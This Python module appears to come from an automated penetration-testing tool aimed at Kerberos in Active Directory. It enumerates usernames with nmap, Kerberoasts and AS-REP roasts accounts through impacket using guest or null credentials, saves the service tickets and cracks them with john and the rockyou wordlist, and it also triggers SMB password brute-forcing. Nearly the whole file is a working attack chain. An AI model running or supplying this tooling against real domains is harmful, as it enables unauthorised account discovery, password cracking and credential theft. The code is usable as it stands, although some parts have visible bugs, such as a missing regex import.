from mods.mod_utils import *
import subprocess
import os


def enum_users(target, domain):
    filename = '/usr/share/seclists/Usernames/Names/names.txt'
    cmd = f'nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{domain}",userdb="{filename}" {target}'
    output = None
    users = []
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

        if output:
            if ('Discovered' in output):
                print_banner('88')
                print('[!] KERBEROS')
                print(f'[!] {cmd}')
                printc('[+] Some usernames where found.', GREEN)
                for line in output.splitlines():
                    if domain in line:
                        user = line.split('@')[0].split(' ')[-1]
                        printc(user, BLUE)
                        users.append(user)
    except Exception as e:
        if not os.path.exists(filename):
            print(f'[-] {filename} does not exist.\nPlease install seclists.')
        printc(f'[-] {e}', RED)
        return users
    return users


def check_rockyou():
    if not os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
        if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'):
            unzip_cmd = 'tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz'
            print('[!] Trying to unzip rockyou.txt.')
            print(f'[!] {unzip_cmd}')
            try:
                subprocess.check_output(unzip_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                mv_cmd = 'mv rockyou.txt /usr/share/seclists/Passwords/Leaked-Databases/'
                subprocess.check_output(mv_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except Exception as e:
                printc(f'[-] {e}', RED)
        else:
            print('[!] Seclist is not installed or rockyou.txt.tar.gz is not on the default folder.')


def crack_tickets():
    if os.path.exists('/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt'):
        print('[!] Trying to crack the tickets.')
        john_cmd = 'john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64'
        print(f'[!] {john_cmd}')
        output = None
        try:
            output = subprocess.check_output(john_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        except Exception as e:
            printc(f'[-] {e}', RED)
        if output:
            printc('[+] Tickets cracked successfully.', GREEN)
            print(output)


def print_cracking_cmd():
    print('[!] To crack the tickets you can use john.')
    print('[!] john tickets.txt -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules=best64')
    print('[!] If the command does not work, unzip the rockyou.txt wordlist first')


def check_kerberoast(target, domain, user='Guest', passw=''):
    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth'

    if (user == ''):
        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth'

    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)

    if output:
        if ('ServicePrincipalName' in output):
            print_banner('88')
            print('[!] KERBEROS')
            print(f'[!] {cmd}')
            printc(f'[+] Some Kerberoastable users where found with the credentials "{user}:{passw}"', GREEN)
            for line in output.splitlines():
                passw_last_set = re.findall('....-..-..\s.*:.*:.*\.', line)
                if passw_last_set:
                    re_user = re.findall('.+\s(\w+)\s', line)
                    if re_user: 
                        kerberoastable_user = re_user[0]
                        printc(f'[+] {kerberoastable_user}', BLUE)
            cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)

            print_separator()
            print('[!] Requesting tickets.')
            print(f'[!] {cmd}')
            if ('KRB_AP_ERR_SKEW' in output):
                printc('[-] Requesting tickets failed.', RED)
                print('[!] Trying to Synchronize TIME with server.')
                time_cmd = f'sntp -sS {target}' 
                print(f'[!] {time_cmd}')
                output = subprocess.check_output(time_cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                if not output:
                    printc('[-] Synchronize failed.', RED)
                    return
                printc('[+] Synchronize Success.', GREEN)
                subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            if os.path.exists('tickets.txt'):
                printc('[+] Tickets stored in tickets.txt', GREEN)
                crack = ''
                while (crack == ''):
                    crack = input("Would you like to crack them now Y/N")
                if (crack.upper() != 'Y'):
                    print_cracking_cmd()
                    return
                try:
                    check_rockyou()

                    crack_tickets()
                    return
                except Exception as e:
                    printc(f'[-] {e}', RED)
            print_cracking_cmd()


def check_smb_credentials(target, domain):
    # Check credentials founded on SMB first:
    if os.path.exists('smb_credentials.txt'):
        with open('smb_credentials.txt', 'r') as file:
            credentials = file.readlines()
        cred = ''
        for item in credentials:
            if ('Guest' not in item):
                cred = item
                break
        user, passwd = cred.split(':')[:2]
        check_kerberoast(target, domain, user, passwd)
        check_asreproast(target, domain, user, passwd)
        return True
    return False


def check_asreproast(target, domain, user='Guest', passw=''):
    # NULL
    if (user == ''):
        filename = 'smb_users.txt'
        if not (os.path.exists(filename)): return

        cmd = f'impacket-GetNPUsers -no-pass {domain}/john.doe -dc-ip {target} -usersfile {filename}'
    # Creds
    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target}'
    
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        printc(f'[-] {e}', RED)

    if output:
        print(output)


def handle_kerberos(target, domain):
    if not check_smb_credentials(target, domain):
        if os.path.exists('smb_users.txt'):
            with open('smb_users.txt', 'r') as file:
                users = file.readlines()
            if not ('lab' in users):
                # Try to bruteforce Usernames
                users = enum_users(target, domain)
                
                # Try to bruteforce users credentials
                import mod_smb
                mod_smb.smb_users = users
                mod_smb.export_wordlists()
                mod_smb.bruteforce(target, '445')

                check_smb_credentials(target, domain)
            else:
                # Check Kerberoast using guest creds
                check_kerberoast(target, domain)
                check_kerberoast(target, domain, '')
                check_asreproast(target, domain)
                check_asreproast(target, domain, '')
        else:
            # Check Kerberoast using guest creds
            check_kerberoast(target, domain)
            check_kerberoast(target, domain, '')
            check_asreproast(target, domain)
            check_asreproast(target, domain, '')